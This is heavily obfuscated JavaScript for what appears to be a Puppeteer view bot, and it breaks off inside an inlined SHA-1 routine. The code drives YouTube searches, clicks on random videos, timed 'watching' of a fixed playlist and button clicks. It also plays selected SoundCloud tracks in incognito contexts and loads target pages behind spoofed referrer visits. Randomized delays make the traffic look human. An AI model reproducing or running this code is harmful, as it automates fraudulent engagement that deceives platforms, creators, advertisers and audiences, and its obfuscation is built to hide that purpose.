const Y = d,
  X = b,
  W = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x9ae + -0xd34 + 0x387))) + i;
}

function a() {
  const bn = [
    'WQBdVSkNFCoGWRCNW4pcUd8',
    'q=0.9',
    'lvzNCfnxv1CToa',
    'zgLNzxn0',
    'sKvIBvHb',
    'esome-and-',
    'D2L0DgvYx0LTyq',
    'zxzHBhvHDgu',
    'BSkKAmoWW4JdL8kDxSkPwW',
    'W7K5rfNcOs9DqSozeW',
    'fakebrowse',
    'W7lcRSkOWOfs',
    'Ahr0Chm6lY9NCG',
    'WPldVmo1',
    'lwnOAwXKkdeP',
    'cGddUYhdRcBdJCkpm8oc',
    'mta0mMi5nJHJyG',
    'x19ZzwfYy2HcBW',
    'W74ZWR0bWPevWP9nW5u+',
    'B3bLCI1YB2fKBq',
    'gCkufCo5o1WRW4qVWQy',
    'WOmqfCoveNtcOWTSea',
    'BNGYltrSnhm0tG',
    'WOVcMmo0ySo1W5ddG8kaWPad',
    'easyfork.o',
    'W7fkl1hcTa',
    'eSkvW7fUif8igmoOWQe',
    'W4vqWQiLWP0aWPr7W4G6',
    'https://me',
    'zw52',
    'tCkXlSkJWODMW4T+WPJdTq',
    'WPSMzCo/W7/cGKNcSCoyqa',
    'D1DRDMLzohPcCG',
    'ChrZl2j5lxnPDa',
    ')\x20AppleWeb',
    'fCopW7SUyrTiq8k5WRW'
  ];
  a = function() {
    return bn;
  };
  return a();
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x5fb * -0x1 + -0x1022 * 0x2 + -0x3 * -0x8c3), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0xbe9 * 0x9 + 0x314f * 0x4 + -0x1b25 * -0x1 + (-0x8 * 0x7ea + -0xedb * -0x5 + -0x59 * -0x89) * random()) : await standardWaitForNetIdle(f), await wait(-0x24f * 0x1 + 0x1 * -0x1726 + 0x2cfd + (-0xdc3 + 0x5 * -0x76f + 0x1 * 0x59fe) * random()), 0xf29 + -0x11 * 0x223 + 0x152b;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2 * 0x10a3 + 0x11d1 * 0x1 + 0xb * -0x4a5);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardWaitForNetIdle(f) {
  return await wait(0xab6 + 0x25 * 0x3b + 0x4b), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1f * -0x123 + -0x14e * -0x1c + -0x14a;
}
async function randomWait() {
  return await wait(-0x48 + 0x5 * -0x3a6 + 0x260e + (0x1 * 0x58b + -0x26c2 + 0x34bf) * random()), 0x4 * 0x6ee + 0x462 * -0x8 + 0x759;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x798 + 0x1f07 + -0x1 * 0x269f, -0x264d + -0x1f6a + 0x45be), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x1ae * 0xc5 + 0x1cb56 + 0x710 * 0xf) * getRandomInt(-0x7 * -0x589 + -0x2543 + 0x2a * -0x9, 0xef4 + 0x739 * -0x5 + 0xa97 * 0x2), h)), 0x32 + 0x1a2d + -0x8ca * 0x3;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x147a + 0xc07 + -0x2d1 * -0x3;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x44b + -0x1 * 0x491 + -0x1 * -0x47]['split']('\x20');
    for (let k = -0x1bad * 0x1 + 0x1 * -0xebc + 0x3db * 0xb; k < i['length']; k += 0xac * 0x11 + -0xeef * -0x1 + -0x1a59)
      j += i[k] * h[i[k + (0x1d74 + -0x1027 + -0xd4c)]];
    return j;
  });
}
async function anchorAndView(f) {
  const R = c;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + R(0xe)), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x619 + -0x27 * 0xf7 + 0x241 * 0xe)['map'](l => Array['from'](l['children']))['flat'](0xd77 * -0x1 + 0xa9a + 0x2de)['map'](l => l['childNodes'][-0x895 + 0x409 * -0x2 + 0x10a8]['childNodes'][-0x1054 + -0x695 + 0x16e9]['childNodes'][-0x6d * -0x1 + -0x2dd * 0xa + -0x1c36 * -0x1]['childNodes'][-0x4 * 0x5ea + -0xd37 * 0x1 + 0x24df]['childNodes'][-0xf3e * 0x1 + 0x1a48 + -0xb09]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(-0x20e + 0x17 * -0x22 + 0x904, -0x4eb * -0x1 + 0x9db + 0x196 * 0x3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0xb52 + -0x19ea + -0x926 * -0x8);
  const h = await getMaxTime(f),
    i = Math['min']((-0x61f + 0x43 * -0x33 + 0xfdd8) * getRandomInt(0x14b * -0x4 + 0x3d * 0x2f + -0x605, 0x5 * 0x5db + 0x1 * 0x2183 + -0x3ec5), h);
  return await wait(i), 0x237a + -0xebf + -0xa5d * 0x2;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x29 * -0x35 + 0x62b * 0x6 + 0x7 * -0x413]['children'][-0x193a + -0x1224 + -0x3d * -0xb6]['children'][0x1ef7 * 0x1 + -0x11 * 0xb3 + -0x94 * 0x21]['children'][0x2109 + 0xda0 + -0x2ea9]['children'][-0x12c7 + -0x12a + 0x13f1]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x181f + 0x1b2b + -0x13 * 0x2b3;
}
async function searchAndView(f) {
  const T = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const S = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById'](S(0x11) + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0x7 * 0x577 + 0x2 * 0x1257 + -0x1f7 * -0x1 + (-0x96d + 0x261b + -0x1c7c) * random()
  }), await wait(-0x34e + -0x1 * 0x52f + -0x3 * -0x37b + (0x1c09 + -0x2 * -0xdc1 + -0x365f * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f[T(0x7)](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x7ac + -0x654 + 0xe02]['childNodes'][-0x13 * 0xb + 0x2 * 0x64d + -0xbc8]['childNodes'][0x1a97 * -0x1 + -0xea7 + 0x293f]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x1ec5 * -0x1 + 0x1723 + -0x3 * -0x28d]['childNodes'][0xa2 + 0x1c46 + -0x1ce8]['childNodes'][-0x25dc + -0x22a + 0x2808]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1c66 + -0x1 * -0x1594 + -0x1 * -0x6d3),
          r = -0xf * -0xa1 + 0x975 + 0x4 * -0x4b9;
        for (let u = -0x2673 + -0x1ab2 + 0x4125; u < q['length']; u += -0x15e + -0x154f + -0x1 * -0x16af)
          r += q[u] * k[q[u + (0x645 + -0xb8c + 0x548)]];
        return r;
      }(n);
  });
  await wait((-0x121a * 0x5 + 0x5b5c + -0x30a * -0x13) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x18 * -0x7a + -0xdc3d + 0x1d20d) * getRandomInt(-0x1f66 + -0x513 + 0x247a, -0xd1f * -0x2 + 0x1 * -0x18a7 + 0x1 * -0x18d), h + (0x1523 + -0x14c * -0x1d + -0x2737));
  return await wait(i), -0x10e0 + -0x21b3 * -0x1 + -0x10d2 * 0x1;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0xda7 + -0x1e76 + 0xd * 0x14b), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0x2e5 + -0x3 * 0x80f + 0x2100 + (0x1ba3 * -0x1 + 0x76 * 0x25 + 0xe7d) * Math['random']());
    });
  }, 0x517 + 0x1111 + 0x530);
  await wait(0x15169 + -0x3cd6c + 0x70fe3);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x3 * 0x505d + 0x14a36 + 0x3 * -0x704f) * getRandomInt(0x1 * 0x9b7 + 0x5a * 0x45 + -0x21f5, -0x23ec + -0xc37 * -0x1 + 0x17ce)), clearInterval(h), 0x45 * -0x13 + -0x2388 + 0x28a8;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1669 + 0x8 * 0x38e + -0x607 * 0x1;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x11 * -0x1d7 + -0xa04 + -0x14a6 * -0x2;
    await randomWait();
  }
  return 0x8 * 0x27a + 0x28 * 0xc1 + -0x31f7;
}

function fetchRandomSC() {
  return Math['random']() <= 0x1 * 0x156d + 0x25fc + 0x3b69 * -0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x6cd * -0x1 + 0x1 * -0x20b3 + 0xc3 * 0x22 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0x183 * 0xf + -0x25c * -0xb + -0x30a1 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x539 * 0x7 + 0x2 * -0x811 + -0x146d;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(-0xe2e7 * -0x1 + -0xd * -0x12ed + -0x202 * 0x94 + getRandomInt(-0x56b0 + 0xd * 0x1a5 + 0x294d * 0x3, -0x4478 * 0x3 + -0x7734 + 0x1b9cc));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x1461 + 0x257f + -0x111d), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x16bd * -0x1 + -0x24b5 + 0x3b72;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2 * 0x10ee + 0x7 * 0x1bd + 0x15b1, -0x100b + 0x1 * -0x257c + 0x35b9)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x81c + 0x10d9 + -0x1 * 0xed + floor((-0x2 * 0xf5c + 0x26b9 + -0x419) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0xfd2aa078 + 0xf1bee6 * -0x93 + -0x15d6629 * -0xa),
          0x1 * -0xe9af07 + 0xfc6131 + 0x6d4dd6,
          0x1b8e + -0xb7 * -0x14d + -0x8999,
          0x6cc + 0x12d7 + -0x1923
        ], y = [
          0x1 * 0x129b + -0x27c + -0x1 * 0x1007,
          0x22ab + 0x212a + -0x43c5 * 0x1,
          -0x303 * -0x5 + 0x222a + -0x7 * 0x707,
          0x1 * -0x1a6d + 0x10e3 + -0xb * -0xde
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x21f4 + -0x1 * -0x781 + -0x1 * 0x2974)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x18 * -0x19e + 0x2 * -0x1101 + 0x1 * 0x48d2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0x22d * 0x6 + -0x2478 + -0x2 * -0x18c3) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              const U = b;
              J ? (A[0x5 * 0x73e + 0x1ea1 + -0x47 * 0xf1] = A[0x7d * -0x28 + -0x1 * -0x1b88 + -0x8 * 0xfe] = A[-0x2069 + -0x1381 * 0x2 + 0x2 * 0x23b6] = A[0x9e8 + 0x132e + -0x1d14] = A[-0x2 * -0x8c3 + -0x9a1 + -0x2 * 0x3f1] = A[-0x1b * 0x7b + -0x1730 + 0x242d] = A[-0x1 * 0x1f6a + 0x4 * -0x254 + 0x28bf] = A[-0x2006 + 0xd * 0x1c4 + -0x8 * -0x123] = A[-0x2 * -0xfc5 + -0xc5 * 0x3 + -0x1d34] = A[0x259d + -0x11be + -0x13d7] = A[-0x1b61 + -0x2dd + 0x1e47] = A[-0xf5 * 0xe + 0x5 * -0x757 + 0x3223] = A[-0x1 * -0x228b + -0x12f * -0x14 + -0xe8b * 0x4] = A[-0x9ae + 0x206c + -0x16b2] = A[0x1 * -0x261e + 0x11c * 0x7 + -0x2b * -0xb5] = A[0x9dc * -0x2 + 0x550 * -0x6 + 0x33a6] = A[0xb9 * -0x25 + -0x17c6 + -0x3292 * -0x1] = -0x103d + -0x2 * 0xcbb + 0x29b3, this['blocks'] = A) : this['blocks'] = [
                -0x6b5 + 0x37 * 0x3f + -0x6d4,
                -0x4ce * 0x5 + 0x1d62 * -0x1 + 0x1ab4 * 0x2,
                0x4ac + 0x81e + -0xcca,
                0xa * 0x2fb + 0x1f6 * 0xa + -0x316a,
                -0x11 * -0xd7 + -0x4 * 0x37e + -0x4f,
                0x40 * -0x1b + -0x1a7 + 0x867,
                -0xb * -0x295 + -0x1741 + -0x293 * 0x2,
                0x17d2 * 0x1 + -0x1a48 + 0x276,
                -0x1e8d + 0x1b7 + 0x1cd6 * 0x1,
                -0x3 * 0x533 + -0x153f + 0x24d8,
                -0x1 * -0x1c0c + -0xf1 * 0x10 + -0xcfc,
                -0xa22 * -0x1 + 0x2 * 0x241 + -0xea4,
                -0x10 * -0x2e + -0x113f + 0x11b * 0xd,
                -0x3 * 0xcc9 + -0x1 * 0x52f + -0x1 * -0x2b8a,
                -0x295 * 0x5 + 0x1465 + -0x77c,
                -0xe08 + -0xf9d + 0x1da5 * 0x1,
                -0x3 * 0x3a5 + -0x1a * -0x5f + -0x2f * -0x7
              ], this['h0'] = 0x2a8eb5ab + -0x74d7 * -0x1483b + -0x71 * 0xc9d727, this['h1'] = 0x248e05d3 + 0xd9ff0ad2 + -0xebf651c, this['h2'] = -0x6a27e3 * -0x20d + 0x1 * -0xdeb84273 + -0x4edfa975 * -0x2, this['h3'] = 0x4e04d95 * 0x1 + -0x653 * -0x3c69b + -0x1417ff * 0xa0, this['h4'] = 0x107ac336d + -0x4 * 0x41aaef17 + 0xc2d26adf, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x8 * 0x42a + -0x866 + 0x29b6, this['finalized'] = this['hashed'] = -0x1 * -0x2c7 + -0x14b8 + 0x1 * 0x11f1, this[U(0x19, 'qWSY')] = -0x22 * -0x1c + 0xe6 * 0xe + -0x1 * 0x104b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1401 + 0x1e6 + -0x1 * -0x121b, O = J['length'] || -0x165b + 0x628 + 0x1033, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x8 * 0x2ce + 0x18 * 0x6c + -0x2090, P[0x9 * -0xf7 + -0x16f * -0xb + 0x2 * -0x38b] = this['block'], P[0x1ab + -0x1e5d + -0x996 * -0x3] = P[0x1470 + 0x2 * -0xadb + -0x6d * -0x3] = P[0x57d * -0x6 + -0x5 * 0x4d9 + -0x7 * -0x82b] = P[-0x26f8 + 0x1af6 + 0xc05 * 0x1] = P[0x5 * 0x2fb + 0x4f * -0x43 + -0xf7 * -0x6] = P[-0x1df9 + -0x1 * 0x5b3 + 0x23b1 * 0x1] = P[-0x1974 + 0x1 * -0x9e6 + 0x8d8 * 0x4] = P[-0x1956 + 0x14d7 + 0x486] = P[0x2d2 + -0x9fe + -0x4 * -0x1cd] = P[-0x2 * 0xdab + -0x2 * 0x9f2 + -0x2f43 * -0x1] = P[-0x74b * 0x2 + 0x15 * -0x146 + 0x295e] = P[0x9af + 0x1 * 0x15fe + -0x1fa2] = P[0x1a85 + -0xc48 + -0xe31] = P[0x1cd0 * -0x1 + -0x1 * 0x119 + 0x1df6] = P[0xf3 * -0x23 + 0x5f2 + 0x1b55] = P[0x1 * 0x1ec5 + 0x2571 + -0x4427] = -0x24f + -0x117 + -0x2 * -0x1b3), K) {
                    for (N = this['start']; M < O && N < 0xbfb * 0x1 + -0x1c98 + 0x10dd; ++M)
                      P[N >> -0x16db + -0x3 * 0x76a + -0x1 * -0x2d1b] |= J[M] << y[0xd22 + -0x8c0 + -0x45f * 0x1 & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x3a * -0xa9 + 0x37b + 0x230f; ++M)
                      (L = J['charCodeAt'](M)) < -0x157 * -0x12 + -0x505 + 0x211 * -0x9 ? P[N >> 0xf62 + -0x2214 + -0x85 * -0x24] |= L << y[0x32e + 0x1e41 + -0x114 * 0x1f & N++] : L < -0x1 * -0x3e3 + -0x2542 + 0x295f ? (P[N >> 0x27f + 0x1bd7 + -0x1 * 0x1e54] |= (-0x1 * 0x12cc + -0x1 * 0x93b + 0x35 * 0x8b | L >> -0x751 * 0x3 + 0x46 * 0x55 + -0x145) << y[0xa * 0xe9 + -0x1afa + 0x11e3 & N++], P[N >> 0x33 * 0xb1 + 0x1 * -0x608 + -0x1d39] |= (0x3af * 0x7 + 0x1ad + -0x1af6 | 0x1 * -0x916 + -0x3 * 0xd03 + 0x305e & L) << y[-0xce6 * 0x2 + -0x651 * -0x4 + 0x8b & N++]) : L < -0x5e69 + 0x167d3 + -0x316a || L >= -0x1866b + -0x191ff + 0x66 * 0x9f7 ? (P[N >> 0x1 * 0x1e3e + -0x1c97 + 0x1a5 * -0x1] |= (0xee7 + -0x2698 + 0x1891 | L >> 0x957 + -0x17ea + 0xe9f) << y[-0x88d + 0x1d6f + -0x14df & N++], P[N >> -0x1b99 + 0xce5 * -0x2 + 0x3565] |= (-0x1364 + -0x1ae6 * -0x1 + 0x2 * -0x381 | L >> 0x259 + 0x1 * 0xfa9 + -0x11fc & -0x666 + 0x20c * -0xa + 0x1b1d) << y[-0x1 * -0xdcd + -0x1dae + 0xfe4 & N++], P[N >> -0x1375 + 0xd8f * 0x1 + 0x5e8] |= (-0x225e + 0x111d * -0x1 + -0x33fb * -0x1 | -0x2548 + -0x1fb3 + 0x1 * 0x453a & L) << y[-0x3b0 + 0x153 + 0x1 * 0x260 & N++]) : (L = -0x146a5 * -0x1 + -0x49aa + 0x1 * 0x305 + ((-0x252 + 0xa2a + -0x3d9 & L) << 0x2510 + -0x2b * -0xbe + -0x44f0 | 0x4 * -0x16f + -0x1 * 0x1dbd + 0x8 * 0x4ef & J['charCodeAt'](++M)), P[N >> -0x759 + -0x2023 + 0x1 * 0x277e] |= (0xc70 + -0x14b * -0x7 + 0x148d * -0x1 | L >> -0xb * 0x1d3 + 0xb3 * 0x3 + -0x120a * -0x1) << y[-0x2 * 0xd + 0x1352 + 0x1335 * -0x1 & N++], P[N >> -0x214c + 0x158f * -0x1 + 0x36dd] |= (0x17ba + 0x3ff + -0x1b39 | L >> 0x24 * -0x53 + -0x1d * -0x5 + 0xb27 & -0x223a + 0x9d * 0xb + 0x1bba) << y[0x545 + -0x2c7 + -0x27b & N++], P[N >> -0x1 * -0x2263 + -0x1873 * -0x1 + -0x3ad4] |= (0xe30 + -0xcac * 0x2 + 0xba8 | L >> -0x58d + -0x301 * 0x7 + -0x5 * -0x552 & 0x17a5 + -0x1 * 0xae7 + -0xc7f * 0x1) << y[0x703 * -0x1 + 0x20e9 + 0x2f * -0x8d & N++], P[N >> -0x5 * 0x746 + -0xb51 + 0x2fb1 * 0x1] |= (0x1006 * -0x2 + -0x24d2 + -0x1a * -0x2ab | -0x1d41 + 0x2681 + -0x901 & L) << y[0x1b6c + 0x1 * -0xcf7 + 0x2b * -0x56 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x509 + 0x2f1 + -0xc8 * -0x3 ? (this['block'] = P[0x125a + -0x1f44 + -0x67d * -0x2], this['start'] = N - (-0x24ad + -0x2 * -0x87b + 0x13f7 * 0x1), this['hash'](), this['hashed'] = -0x1648 + 0x9b2 + 0xc97) : this['start'] = N;
                }
                return this['bytes'] > -0xf0c1b7 * 0x191 + -0x3a02ce21 * -0x3 + 0x1cb170543 && (this['hBytes'] += this['bytes'] / (-0x1df547cc * -0xb + -0x2e3c54a8 + 0x15d7cdb * -0x14) << -0x3 * -0x937 + 0x13c0 + -0x2f65 * 0x1, this['bytes'] = this['bytes'] % (0x19ae2c974 + -0x7737 * -0x84cc + 0x8 * -0x1b1744a9)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x3e * -0x14 + -0xaf6 * 0x1 + 0x61f;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x512 + -0x1 * -0x1c39 + -0x1717 * 0x1] = this['block'], J[K >> 0x2684 + -0x4 * -0x7c9 + -0xa * 0x6f7] |= x[-0x29 * -0x93 + -0x2 * 0x2 + -0x1784 & K], this['block'] = J[0x29 * -0xd3 + -0x1fba + 0x4195], K >= 0xa22 + 0x1ac3 + -0x29 * 0xe5 && (this['hashed'] || this['hash'](), J[0x7ba * 0x1 + -0x14c8 + 0xd0e] = this['block'], J[0x8c0 + 0x1a47 + -0x1 * 0x22f7] = J[0x575 + 0x13ab + -0x191f] = J[-0x151 * 0x1b + 0xf84 + -0x1409 * -0x1] = J[0x1009 + -0x1 * 0x25cf + 0x15c9] = J[0x1 * -0x1ad5 + -0x1 * -0x1cff + -0x226] = J[-0x4a * -0x77 + -0xb44 * -0x1 + -0x3 * 0xf37] = J[0x14b5 + -0xc5a + -0x3 * 0x2c7] = J[-0x2596 + 0x24e0 + -0xbd * -0x1] = J[0x25b5 + 0x19a0 + -0x3f4d] = J[0xa19 + 0xbef + -0x755 * 0x3] = J[0x1ff9 + -0x7a9 + -0x1de * 0xd] = J[-0x1b69 + -0x26ee + 0x4262] = J[-0x30 * -0x4 + -0x1 * -0x25df + -0x2693] = J[0xc58 + -0x2 * -0x84a + 0x185 * -0x13] = J[0x12d6 + 0xd3 * 0x1 + -0x139b] = J[0x1 * -0xa2a + 0x1a * -0x31 + 0xf33 * 0x1] = 0x878 + 0x1af9 * -0x1 + 0x1281), J[-0x14fd + 0x1636 + 0x17 * -0xd] = this['hBytes'] << -0x2378 + 0x1dee + -0x7 * -0xcb | this['bytes'] >>> -0x43 * -0x47 + 0x132c + -0x25a4, J[0x44 * -0x34 + -0x2335 * 0x1 + 0x3114] = this['bytes'] << -0x64 * 0x4d + -0x1113 * -0x1 + 0xd04, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x129f * 0x1 + -0x17aa + -0x51b * -0x1; J < 0xd10 + 0x18d * 0x16 + -0x359 * 0xe; ++J)
